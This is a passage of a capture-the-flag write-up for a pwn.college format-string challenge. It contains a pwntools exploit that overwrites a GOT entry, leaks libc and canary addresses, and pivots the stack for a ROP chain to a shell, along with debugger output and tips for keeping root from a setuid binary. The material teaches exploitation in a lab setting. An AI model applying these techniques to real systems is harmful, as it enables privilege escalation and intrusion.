<a id="__codelineno-4-36" name="__codelineno-4-36" href="#__codelineno-4-36"></a><span class="c1"># GDB will be launched if the exploit is run via e.g.</span>
<a id="__codelineno-4-37" name="__codelineno-4-37" href="#__codelineno-4-37"></a><span class="c1"># ./exploit.py GDB</span>
<a id="__codelineno-4-38" name="__codelineno-4-38" href="#__codelineno-4-38"></a><span class="n">gdbscript</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;</span>
<a id="__codelineno-4-39" name="__codelineno-4-39" href="#__codelineno-4-39"></a><span class="s1">b *func+444</span>
<a id="__codelineno-4-40" name="__codelineno-4-40" href="#__codelineno-4-40"></a><span class="s1">continue</span>
<a id="__codelineno-4-41" name="__codelineno-4-41" href="#__codelineno-4-41"></a><span class="s1">c</span>
<a id="__codelineno-4-42" name="__codelineno-4-42" href="#__codelineno-4-42"></a><span class="s1">c</span>
<a id="__codelineno-4-43" name="__codelineno-4-43" href="#__codelineno-4-43"></a><span class="s1">si</span>
<a id="__codelineno-4-44" name="__codelineno-4-44" href="#__codelineno-4-44"></a><span class="s1">nextret</span>
<a id="__codelineno-4-45" name="__codelineno-4-45" href="#__codelineno-4-45"></a><span class="s1">&#39;&#39;&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="o">**</span><span class="nb">locals</span><span class="p">())</span>
<a id="__codelineno-4-46" name="__codelineno-4-46" href="#__codelineno-4-46"></a>
<a id="__codelineno-4-47" name="__codelineno-4-47" href="#__codelineno-4-47"></a><span class="c1">#===========================================================</span>
<a id="__codelineno-4-48" name="__codelineno-4-48" href="#__codelineno-4-48"></a><span class="c1">#                    EXPLOIT GOES HERE</span>
<a id="__codelineno-4-49" name="__codelineno-4-49" href="#__codelineno-4-49"></a><span class="c1">#===========================================================</span>
<a id="__codelineno-4-50" name="__codelineno-4-50" href="#__codelineno-4-50"></a><span class="c1"># Arch:     amd64-64-little</span>
<a id="__codelineno-4-51" name="__codelineno-4-51" href="#__codelineno-4-51"></a><span class="c1"># RELRO:      Partial RELRO</span>
<a id="__codelineno-4-52" name="__codelineno-4-52" href="#__codelineno-4-52"></a><span class="c1"># Stack:      No canary found</span>
<a id="__codelineno-4-53" name="__codelineno-4-53" href="#__codelineno-4-53"></a><span class="c1"># NX:         NX enabled</span>
<a id="__codelineno-4-54" name="__codelineno-4-54" href="#__codelineno-4-54"></a><span class="c1"># PIE:        No PIE (0x400000)</span>
<a id="__codelineno-4-55" name="__codelineno-4-55" href="#__codelineno-4-55"></a><span class="c1"># SHSTK:      Enabled</span>
<a id="__codelineno-4-56" name="__codelineno-4-56" href="#__codelineno-4-56"></a><span class="c1"># IBT:        Enabled</span>
<a id="__codelineno-4-57" name="__codelineno-4-57" href="#__codelineno-4-57"></a><span class="c1"># Stripped:   No</span>
<a id="__codelineno-4-58" name="__codelineno-4-58" href="#__codelineno-4-58"></a>
<a id="__codelineno-4-59" name="__codelineno-4-59" href="#__codelineno-4-59"></a><span class="k">def</span><span class="w"> </span><span class="nf">send_fmt</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
<a id="__codelineno-4-60" name="__codelineno-4-60" href="#__codelineno-4-60"></a>    <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;printf on your input and then exit.</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
<a id="__codelineno-4-61" name="__codelineno-4-61" href="#__codelineno-4-61"></a>
<a id="__codelineno-4-62" name="__codelineno-4-62" href="#__codelineno-4-62"></a><span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
<a id="__codelineno-4-63" name="__codelineno-4-63" href="#__codelineno-4-63"></a>
<a id="__codelineno-4-64" name="__codelineno-4-64" href="#__codelineno-4-64"></a><span class="c1">####################################</span>
<a id="__codelineno-4-65" name="__codelineno-4-65" href="#__codelineno-4-65"></a><span class="c1">####### Redirect exit to func ######</span>
<a id="__codelineno-4-66" name="__codelineno-4-66" href="#__codelineno-4-66"></a><span class="c1">####################################</span>
<a id="__codelineno-4-67" name="__codelineno-4-67" href="#__codelineno-4-67"></a>
<a id="__codelineno-4-68" name="__codelineno-4-68" href="#__codelineno-4-68"></a><span class="n">f</span> <span class="o">=</span> <span class="n">FmtStr</span><span class="p">(</span><span class="n">send_fmt</span><span class="p">,</span> <span class="n">offset</span><span class="o">=</span><span class="mi">46</span><span class="p">,</span> <span class="n">padlen</span><span class="o">=</span><span class="mi">4</span><span class="p">,</span> <span class="n">numbwritten</span><span class="o">=</span><span class="mh">0x6c</span><span class="p">)</span>
<a id="__codelineno-4-69" name="__codelineno-4-69" href="#__codelineno-4-69"></a><span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">exe</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;exit&#39;</span><span class="p">],</span> <span class="n">exe</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">func</span><span class="p">)</span>
<a id="__codelineno-4-70" name="__codelineno-4-70" href="#__codelineno-4-70"></a><span class="n">f</span><span class="o">.</span><span class="n">execute_writes</span><span class="p">()</span>
<a id="__codelineno-4-71" name="__codelineno-4-71" href="#__codelineno-4-71"></a>
<a id="__codelineno-4-72" name="__codelineno-4-72" href="#__codelineno-4-72"></a>
<a id="__codelineno-4-73" name="__codelineno-4-73" href="#__codelineno-4-73"></a><span class="c1">####################################</span>
<a id="__codelineno-4-74" name="__codelineno-4-74" href="#__codelineno-4-74"></a><span class="c1">#### Leak Part #####################</span>
<a id="__codelineno-4-75" name="__codelineno-4-75" href="#__codelineno-4-75"></a><span class="c1">####################################</span>
<a id="__codelineno-4-76" name="__codelineno-4-76" href="#__codelineno-4-76"></a>
<a id="__codelineno-4-77" name="__codelineno-4-77" href="#__codelineno-4-77"></a><span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">(</span><span class="s1">&#39;%3$p|%161$p|%164$p|&#39;</span><span class="p">)</span>
<a id="__codelineno-4-78" name="__codelineno-4-78" href="#__codelineno-4-78"></a><span class="n">send_fmt</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<a id="__codelineno-4-79" name="__codelineno-4-79" href="#__codelineno-4-79"></a><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Your input is:&#39;</span><span class="p">)</span>
<a id="__codelineno-4-80" name="__codelineno-4-80" href="#__codelineno-4-80"></a><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
<a id="__codelineno-4-81" name="__codelineno-4-81" href="#__codelineno-4-81"></a>
<a id="__codelineno-4-82" name="__codelineno-4-82" href="#__codelineno-4-82"></a><span class="n">leaks</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;|&#39;</span><span class="p">)</span>
<a id="__codelineno-4-83" name="__codelineno-4-83" href="#__codelineno-4-83"></a>
<a id="__codelineno-4-84" name="__codelineno-4-84" href="#__codelineno-4-84"></a><span class="n">leak_write23</span><span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">leaks</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
<a id="__codelineno-4-85" name="__codelineno-4-85" href="#__codelineno-4-85"></a><span class="n">leak_canary</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">leaks</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
<a id="__codelineno-4-86" name="__codelineno-4-86" href="#__codelineno-4-86"></a><span class="n">rbp_addr</span>    <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">leaks</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span><span class="o">-</span><span class="mh">0xa00</span>
<a id="__codelineno-4-87" name="__codelineno-4-87" href="#__codelineno-4-87"></a>
<a id="__codelineno-4-88" name="__codelineno-4-88" href="#__codelineno-4-88"></a><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">leak_write23</span> <span class="o">-</span> <span class="mh">0x10e297</span> <span class="c1"># offset of write+23</span>
<a id="__codelineno-4-89" name="__codelineno-4-89" href="#__codelineno-4-89"></a>
<a id="__codelineno-4-90" name="__codelineno-4-90" href="#__codelineno-4-90"></a><span class="n">success</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;LIBC Base Address: </span><span class="si">{</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="si">:</span><span class="s1">#x</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
<a id="__codelineno-4-91" name="__codelineno-4-91" href="#__codelineno-4-91"></a><span class="n">success</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Canary Value     : </span><span class="si">{</span><span class="n">leak_canary</span><span class="si">:</span><span class="s1">#x</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
<a id="__codelineno-4-92" name="__codelineno-4-92" href="#__codelineno-4-92"></a><span class="n">success</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;RBP Address      : </span><span class="si">{</span><span class="n">rbp_addr</span><span class="si">:</span><span class="s1">#x</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
<a id="__codelineno-4-93" name="__codelineno-4-93" href="#__codelineno-4-93"></a>
<a id="__codelineno-4-94" name="__codelineno-4-94" href="#__codelineno-4-94"></a><span class="c1">####################################</span>
<a id="__codelineno-4-95" name="__codelineno-4-95" href="#__codelineno-4-95"></a><span class="c1">#### Write Part ####################</span>
<a id="__codelineno-4-96" name="__codelineno-4-96" href="#__codelineno-4-96"></a><span class="c1">####################################</span>
<a id="__codelineno-4-97" name="__codelineno-4-97" href="#__codelineno-4-97"></a>
<a id="__codelineno-4-98" name="__codelineno-4-98" href="#__codelineno-4-98"></a><span class="n">target_address</span> <span class="o">=</span> <span class="n">exe</span><span class="o">.</span><span class="n">bss</span><span class="p">()</span><span class="o">+</span><span class="mh">0x680</span>
<a id="__codelineno-4-99" name="__codelineno-4-99" href="#__codelineno-4-99"></a>
<a id="__codelineno-4-100" name="__codelineno-4-100" href="#__codelineno-4-100"></a><span class="n">success</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Target address: </span><span class="si">{</span><span class="n">target_address</span><span class="si">:</span><span class="s1">#x</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
<a id="__codelineno-4-101" name="__codelineno-4-101" href="#__codelineno-4-101"></a>
<a id="__codelineno-4-102" name="__codelineno-4-102" href="#__codelineno-4-102"></a><span class="c1">###### rop chain generation ########</span>
<a id="__codelineno-4-103" name="__codelineno-4-103" href="#__codelineno-4-103"></a><span class="n">binsh</span> <span class="o">=</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;/bin/sh</span><span class="se">\0</span><span class="s1">&#39;</span><span class="p">))</span>
<a id="__codelineno-4-104" name="__codelineno-4-104" href="#__codelineno-4-104"></a>
<a id="__codelineno-4-105" name="__codelineno-4-105" href="#__codelineno-4-105"></a><span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">([</span><span class="n">exe</span><span class="p">,</span> <span class="n">libc</span><span class="p">])</span>
<a id="__codelineno-4-106" name="__codelineno-4-106" href="#__codelineno-4-106"></a>
<a id="__codelineno-4-107" name="__codelineno-4-107" href="#__codelineno-4-107"></a><span class="n">pop_rdi</span>     <span class="o">=</span> <span class="n">rop</span><span class="o">.</span><span class="n">find_gadget</span><span class="p">([</span><span class="s1">&#39;pop rdi&#39;</span><span class="p">,</span> <span class="s1">&#39;ret&#39;</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
<a id="__codelineno-4-108" name="__codelineno-4-108" href="#__codelineno-4-108"></a><span class="n">pop_rsp</span>     <span class="o">=</span> <span class="n">rop</span><span class="o">.</span><span class="n">find_gadget</span><span class="p">([</span><span class="s1">&#39;pop rsp&#39;</span><span class="p">,</span> <span class="s1">&#39;ret&#39;</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
<a id="__codelineno-4-109" name="__codelineno-4-109" href="#__codelineno-4-109"></a><span class="n">ret</span>         <span class="o">=</span> <span class="n">rop</span><span class="o">.</span><span class="n">find_gadget</span><span class="p">([</span><span class="s1">&#39;ret&#39;</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
<a id="__codelineno-4-110" name="__codelineno-4-110" href="#__codelineno-4-110"></a>
<a id="__codelineno-4-111" name="__codelineno-4-111" href="#__codelineno-4-111"></a><span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">rbp_addr</span><span class="o">-</span><span class="mh">0x4f8</span><span class="p">,</span> <span class="n">pop_rsp</span><span class="p">)</span>        <span class="c1"># ---&gt; printf return address</span>
<a id="__codelineno-4-112" name="__codelineno-4-112" href="#__codelineno-4-112"></a><span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">rbp_addr</span><span class="o">-</span><span class="mh">0x4f0</span><span class="p">,</span> <span class="n">target_address</span><span class="p">)</span> <span class="c1"># ---&gt; printf return address+8</span>
<a id="__codelineno-4-113" name="__codelineno-4-113" href="#__codelineno-4-113"></a><span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">target_address</span><span class="p">,</span> <span class="mh">0xdeadbabe</span><span class="p">)</span>
<a id="__codelineno-4-114" name="__codelineno-4-114" href="#__codelineno-4-114"></a>
<a id="__codelineno-4-115" name="__codelineno-4-115" href="#__codelineno-4-115"></a><span class="n">f</span><span class="o">.</span><span class="n">execute_writes</span><span class="p">()</span>
<a id="__codelineno-4-116" name="__codelineno-4-116" href="#__codelineno-4-116"></a>
<a id="__codelineno-4-117" name="__codelineno-4-117" href="#__codelineno-4-117"></a><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div>
<p>How the calculation works explained below. </p>
<p>After executing previous script, the return address of <strong>printf</strong> points to <strong>pop rsp; ret</strong> gadget.
The distance between <strong>printf</strong>'s return address and <strong>rbp address</strong> is : <strong>rbp_address-0x4f8: return address of printf</strong>.</p>
<p><img alt="" src="../images/c0ce5225412084869e44c54584bfc46a.png" /></p>
<p>Continue to execution will cause segmentation of on <strong>RIP=0xdeadbabe</strong>.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="nt">pwndbg</span><span class="o">&gt;</span><span class="w"> </span><span class="nt">c</span>
<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="nt">Continuing</span><span class="o">.</span>
<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>
<a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a><span class="nt">Program</span><span class="w"> </span><span class="nt">received</span><span class="w"> </span><span class="nt">signal</span><span class="w"> </span><span class="nt">SIGSEGV</span><span class="o">,</span><span class="w"> </span><span class="nt">Segmentation</span><span class="w"> </span><span class="nt">fault</span><span class="o">.</span>
<a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a><span class="nt">0x00000000deadbabe</span><span class="w"> </span><span class="nt">in</span><span class="w"> </span><span class="o">??</span><span class="w"> </span><span class="o">()</span>
<a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a><span class="nt">LEGEND</span><span class="o">:</span><span class="w"> </span><span class="nt">STACK</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nt">HEAP</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nt">CODE</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nt">DATA</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nt">WX</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nt">RODATA</span>
<a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a><span class="err">ââââââââââââââââââââ</span><span class="o">[</span><span class="w"> </span><span class="nt">REGISTERS</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="nt">show-flags</span><span class="w"> </span><span class="nt">off</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="nt">show-compact-regs</span><span class="w"> </span><span class="nt">off</span><span class="w"> </span><span class="o">]</span><span class="err">âââââââââââââââââââââ</span>
<a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a><span class="w"> </span><span class="nt">RAX</span><span class="w">  </span><span class="nt">0x2aa</span>
<a id="__codelineno-5-9" name="__codelineno-5-9" href="#__codelineno-5-9"></a><span class="w"> </span><span class="nt">RBX</span><span class="w">  </span><span class="nt">0x2020202020202020</span><span class="w"> </span><span class="o">(</span><span class="s1">&#39;        &#39;</span><span class="o">)</span>
<a id="__codelineno-5-10" name="__codelineno-5-10" href="#__codelineno-5-10"></a><span class="w"> </span><span class="nt">RCX</span><span class="w">  </span><span class="nt">0</span>
<a id="__codelineno-5-11" name="__codelineno-5-11" href="#__codelineno-5-11"></a><span class="w"> </span><span class="nt">RDX</span><span class="w">  </span><span class="nt">0</span>
<a id="__codelineno-5-12" name="__codelineno-5-12" href="#__codelineno-5-12"></a><span class="w"> </span><span class="nt">RDI</span><span class="w">  </span><span class="nt">0x7f844a7597e0</span><span class="w"> </span><span class="o">(</span><span class="nt">_IO_stdfile_1_lock</span><span class="o">)</span><span class="w"> </span><span class="err">ââ</span><span class="w"> </span><span class="nt">0</span>
<a id="__codelineno-5-13" name="__codelineno-5-13" href="#__codelineno-5-13"></a><span class="w"> </span><span class="nt">RSI</span><span class="w">  </span><span class="nt">0x7fffdd316ab0</span><span class="w"> </span><span class="err">ââ</span><span class="w"> </span><span class="nt">0x706e692072756f59</span><span class="w"> </span><span class="o">(</span><span class="s1">&#39;Your inp&#39;</span><span class="o">)</span>
<a id="__codelineno-5-14" name="__codelineno-5-14" href="#__codelineno-5-14"></a><span class="w"> </span><span class="nt">R8</span><span class="w">   </span><span class="nt">0x2aa</span>
<a id="__codelineno-5-15" name="__codelineno-5-15" href="#__codelineno-5-15"></a><span class="w"> </span><span class="nt">R9</span><span class="w">   </span><span class="nt">0x2aa</span>
<a id="__codelineno-5-16" name="__codelineno-5-16" href="#__codelineno-5-16"></a><span class="w"> </span><span class="nt">R10</span><span class="w">  </span><span class="nt">0xa084ab0</span><span class="w"> </span><span class="err">ââ</span><span class="w"> </span><span class="nt">0x4a758723</span>
<a id="__codelineno-5-17" name="__codelineno-5-17" href="#__codelineno-5-17"></a><span class="w"> </span><span class="nt">R11</span><span class="w">  </span><span class="nt">0x246</span>
<a id="__codelineno-5-18" name="__codelineno-5-18" href="#__codelineno-5-18"></a><span class="w"> </span><span class="nt">R12</span><span class="w">  </span><span class="nt">0x401190</span><span class="w"> </span><span class="o">(</span><span class="nt">_start</span><span class="o">)</span><span class="w"> </span><span class="err">ââ</span><span class="w"> </span><span class="nt">endbr64</span><span class="w"> </span>
<a id="__codelineno-5-19" name="__codelineno-5-19" href="#__codelineno-5-19"></a><span class="w"> </span><span class="nt">R13</span><span class="w">  </span><span class="nt">0x7fffdd31a180</span><span class="w"> </span><span class="err">ââ</span><span class="w"> </span><span class="nt">1</span>
<a id="__codelineno-5-20" name="__codelineno-5-20" href="#__codelineno-5-20"></a><span class="w"> </span><span class="nt">R14</span><span class="w">  </span><span class="nt">0</span>
<a id="__codelineno-5-21" name="__codelineno-5-21" href="#__codelineno-5-21"></a><span class="w"> </span><span class="nt">R15</span><span class="w">  </span><span class="nt">0</span>
<a id="__codelineno-5-22" name="__codelineno-5-22" href="#__codelineno-5-22"></a><span class="w"> </span><span class="nt">RBP</span><span class="w">  </span><span class="nt">0x7fffdd319640</span><span class="w"> </span><span class="err">ââ¸</span><span class="w"> </span><span class="nt">0x7fffdd319b40</span><span class="w"> </span><span class="err">ââ¸</span><span class="w"> </span><span class="nt">0x7fffdd31a040</span><span class="w"> </span><span class="err">ââ¸</span><span class="w"> </span><span class="nt">0x7fffdd31a090</span><span class="w"> </span><span class="err">ââ</span><span class="w"> </span><span class="nt">0</span>
<a id="__codelineno-5-23" name="__codelineno-5-23" href="#__codelineno-5-23"></a><span class="o">*</span><span class="nt">RSP</span><span class="w">  </span><span class="nt">0x404708</span><span class="w"> </span><span class="err">ââ</span><span class="w"> </span><span class="nt">0</span>
<a id="__codelineno-5-24" name="__codelineno-5-24" href="#__codelineno-5-24"></a><span class="o">*</span><span class="nt">RIP</span><span class="w">  </span><span class="nt">0xdeadbabe</span>
<a id="__codelineno-5-25" name="__codelineno-5-25" href="#__codelineno-5-25"></a><span class="err">âââââââââââââââââââââââââââââ</span><span class="o">[</span><span class="w"> </span><span class="nt">DISASM</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="nt">x86-64</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="nt">set</span><span class="w"> </span><span class="nt">emulate</span><span class="w"> </span><span class="nt">on</span><span class="w"> </span><span class="o">]</span><span class="err">ââââââââââââââââââââââââââââââ</span>
<a id="__codelineno-5-26" name="__codelineno-5-26" href="#__codelineno-5-26"></a><span class="nt">Invalid</span><span class="w"> </span><span class="nt">address</span><span class="w"> </span><span class="nt">0xdeadbabe</span>
</code></pre></div>
<h3 id="get_flagpy">get_flag.py</h3>
<p>After taking control of RIP, rest is generating <strong>ROP Chain</strong> and wait for shell.</p>
<blockquote>
<p>Note for reader:</p>
<blockquote>
<p>In the pwn.college setup the challenge binary is <strong>setuid-root</strong>. If you spawn a shell directly (e.g., via <code>system("/bin/sh")</code>), most shells detect they were invoked from a setuid context and <strong>drop privileges to your real UID</strong> for safety. </p>
<p>To retain privileges, first make the real/effective/saved UIDs all zero (e.g., call <code>setuid(0)</code> or <code>setresuid(0,0,0)</code>) <strong>before</strong> <code>execve</code>-ing a shell; alternatively, exec a shell in <em>privileged mode</em> (e.g., <code>bash -p</code>) so it doesnât discard the elevated EUID. Otherwise, your âroot shellâ will immediately lose root.</p>
</blockquote>
</blockquote>
<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="ch">#!/usr/bin/env python3</span>
<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="c1"># -*- coding: utf-8 -*-</span>
<a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span class="c1"># This exploit template was generated via:</span>
<a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a><span class="c1"># $ pwn template &#39;--libc=./libc.so.6&#39; ./babyfmt_level10.0</span>
<a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
<a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a>
<a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a><span class="c1"># Set up pwntools for the correct architecture</span>
<a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a><span class="n">exe</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">EXE</span> <span class="ow">or</span> <span class="s1">&#39;./babyfmt_level10.0&#39;</span><span class="p">)</span>
<a id="__codelineno-6-9" name="__codelineno-6-9" href="#__codelineno-6-9"></a>
<a id="__codelineno-6-10" name="__codelineno-6-10" href="#__codelineno-6-10"></a><span class="c1"># Many built-in settings can be controlled on the command-line and show up</span>
<a id="__codelineno-6-11" name="__codelineno-6-11" href="#__codelineno-6-11"></a><span class="c1"># in &quot;args&quot;.  For example, to dump all data sent/received, and disable ASLR</span>
<a id="__codelineno-6-12" name="__codelineno-6-12" href="#__codelineno-6-12"></a><span class="c1"># for all created processes...</span>
<a id="__codelineno-6-13" name="__codelineno-6-13" href="#__codelineno-6-13"></a><span class="c1"># ./exploit.py DEBUG NOASLR</span>
<a id="__codelineno-6-14" name="__codelineno-6-14" href="#__codelineno-6-14"></a>
<a id="__codelineno-6-15" name="__codelineno-6-15" href="#__codelineno-6-15"></a><span class="c1"># Use the specified remote libc version unless explicitly told to use the</span>
<a id="__codelineno-6-16" name="__codelineno-6-16" href="#__codelineno-6-16"></a><span class="c1"># local system version with the `LOCAL_LIBC` argument.</span>
<a id="__codelineno-6-17" name="__codelineno-6-17" href="#__codelineno-6-17"></a><span class="c1"># ./exploit.py LOCAL LOCAL_LIBC</span>
<a id="__codelineno-6-18" name="__codelineno-6-18" href="#__codelineno-6-18"></a><span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">LOCAL_LIBC</span><span class="p">:</span>
<a id="__codelineno-6-19" name="__codelineno-6-19" href="#__codelineno-6-19"></a>    <span class="n">libc</span> <span class="o">=</span> <span class="n">exe</span><span class="o">.</span><span class="n">libc</span>
<a id="__codelineno-6-20" name="__codelineno-6-20" href="#__codelineno-6-20"></a><span class="k">else</span><span class="p">:</span>
<a id="__codelineno-6-21" name="__codelineno-6-21" href="#__codelineno-6-21"></a>    <span class="n">library_path</span> <span class="o">=</span> <span class="n">libcdb</span><span class="o">.</span><span class="n">download_libraries</span><span class="p">(</span><span class="s1">&#39;./libc.so.6&#39;</span><span class="p">)</span>
<a id="__codelineno-6-22" name="__codelineno-6-22" href="#__codelineno-6-22"></a>    <span class="k">if</span> <span class="n">library_path</span><span class="p">:</span>
<a id="__codelineno-6-23" name="__codelineno-6-23" href="#__codelineno-6-23"></a>        <span class="n">exe</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="o">.</span><span class="n">patch_custom_libraries</span><span class="p">(</span><span class="n">exe</span><span class="o">.</span><span class="n">path</span><span class="p">,</span> <span class="n">library_path</span><span class="p">)</span>
<a id="__codelineno-6-24" name="__codelineno-6-24" href="#__codelineno-6-24"></a>        <span class="n">libc</span> <span class="o">=</span> <span class="n">exe</span><span class="o">.</span><span class="n">libc</span>
<a id="__codelineno-6-25" name="__codelineno-6-25" href="#__codelineno-6-25"></a>    <span class="k">else</span><span class="p">:</span>
<a id="__codelineno-6-26" name="__codelineno-6-26" href="#__codelineno-6-26"></a>        <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./libc.so.6&#39;</span><span class="p">)</span>
<a id="__codelineno-6-27" name="__codelineno-6-27" href="#__codelineno-6-27"></a>
<a id="__codelineno-6-28" name="__codelineno-6-28" href="#__codelineno-6-28"></a><span class="k">def</span><span class="w"> </span><span class="nf">start</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
<a id="__codelineno-6-29" name="__codelineno-6-29" href="#__codelineno-6-29"></a><span class="w">    </span><span class="sd">&#39;&#39;&#39;Start the exploit against the target.&#39;&#39;&#39;</span>
<a id="__codelineno-6-30" name="__codelineno-6-30" href="#__codelineno-6-30"></a>    <span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
<a id="__codelineno-6-31" name="__codelineno-6-31" href="#__codelineno-6-31"></a>        <span class="k">return</span> <span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">([</span><span class="n">exe</span><span class="o">.</span><span class="n">path</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
<a id="__codelineno-6-32" name="__codelineno-6-32" href="#__codelineno-6-32"></a>    <span class="k">else</span><span class="p">:</span>
<a id="__codelineno-6-33" name="__codelineno-6-33" href="#__codelineno-6-33"></a>        <span class="k">return</span> <span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="o">.</span><span class="n">path</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
<a id="__codelineno-6-34" name="__codelineno-6-34" href="#__codelineno-6-34"></a>
<a id="__codelineno-6-35" name="__codelineno-6-35" href="#__codelineno-6-35"></a><span class="c1"># Specify your GDB script here for debugging</span>
<a id="__codelineno-6-36" name="__codelineno-6-36" href="#__codelineno-6-36"></a><span class="c1"># GDB will be launched if the exploit is run via e.g.</span>
<a id="__codelineno-6-37" name="__codelineno-6-37" href="#__codelineno-6-37"></a><span class="c1"># ./exploit.py GDB</span>
<a id="__codelineno-6-38" name="__codelineno-6-38" href="#__codelineno-6-38"></a><span class="n">gdbscript</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;</span>
<a id="__codelineno-6-39" name="__codelineno-6-39" href="#__codelineno-6-39"></a><span class="s1">b *func+444</span>
<a id="__codelineno-6-40" name="__codelineno-6-40" href="#__codelineno-6-40"></a><span class="s1">continue</span>
<a id="__codelineno-6-41" name="__codelineno-6-41" href="#__codelineno-6-41"></a><span class="s1">c</span>
